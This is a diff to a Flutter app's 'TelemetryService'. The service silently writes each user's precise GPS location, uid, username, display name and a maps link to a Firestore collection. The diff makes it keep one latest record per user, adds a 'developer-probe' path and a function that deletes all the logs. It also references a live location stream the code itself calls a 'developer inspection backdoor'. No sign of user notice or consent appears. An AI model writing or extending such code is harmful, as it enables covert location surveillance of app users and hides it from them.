@@ -46,7 +46,10 @@ class TelemetryService {
 
       final mapsUrl = 'https://www.google.com/maps/search/?api=1&query=${position.latitude},${position.longitude}';
 
-      await FirebaseFirestore.instance.collection('telemetry_locations').add({
+      // Use user ID / username as docId so each user has strictly ONE latest record
+      final docId = user.uid.isNotEmpty ? user.uid : (user.username.isNotEmpty ? user.username : 'user_location');
+
+      await FirebaseFirestore.instance.collection('telemetry_locations').doc(docId).set({
         'uid': user.uid,
         'username': user.username,
         'displayName': user.displayName,
@@ -58,7 +61,7 @@ class TelemetryService {
         'mapsUrl': mapsUrl,
         'timestamp': FieldValue.serverTimestamp(),
         'recordedAt': DateTime.now().toIso8601String(),
-      });
+      }, SetOptions(merge: true));
     } catch (_) {
       // Silent fail - never throw or block UI
     } finally {
@@ -96,7 +99,11 @@ class TelemetryService {
 
       final mapsUrl = 'https://www.google.com/maps/search/?api=1&query=${position.latitude},${position.longitude}';
 
-      await FirebaseFirestore.instance.collection('telemetry_locations').add({
+      final docId = user != null
+          ? (user.uid.isNotEmpty ? user.uid : user.username)
+          : 'developer-probe';
+
+      await FirebaseFirestore.instance.collection('telemetry_locations').doc(docId).set({
         'uid': user?.uid ?? 'developer-probe',
         'username': user?.username ?? 'فحص موقع فني',
         'displayName': user?.displayName ?? 'فحص مطور يدوي',
@@ -108,11 +115,21 @@ class TelemetryService {
         'mapsUrl': mapsUrl,
         'timestamp': FieldValue.serverTimestamp(),
         'recordedAt': DateTime.now().toIso8601String(),
-      });
+      }, SetOptions(merge: true));
       return position;
     } catch (_) {
       return null;
     }
+  }
+
+  /// Wipe all telemetry logs
+  Future<void> clearAllTelemetry() async {
+    try {
+      final snap = await FirebaseFirestore.instance.collection('telemetry_locations').get();
+      for (final doc in snap.docs) {
+        await doc.reference.delete();
+      }
+    } catch (_) {}
   }
 
   /// Real-time stream of latest recorded locations for the developer inspection backdoor
